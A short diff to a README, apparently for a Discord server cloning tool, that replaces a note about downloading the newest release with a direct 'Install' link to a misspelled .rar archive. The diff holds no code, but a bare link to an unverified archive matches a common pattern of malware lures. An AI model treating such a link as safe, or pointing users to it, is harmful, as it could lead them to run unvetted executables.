@@ -9,10 +9,7 @@
   </kbd>
 </p>
 
-## 🔑・Important!
-```js
-・ If you want to use the application quickly and smoothly without any errors, I recommend you to download the newest and most updated version from the "Relase" section.
-```
+🚀 Install --> [Releases](https://github.com/PollarEx/Discord-Server-Cloner/releases/download/v2.1/Relase.rar)
 
 ---
 
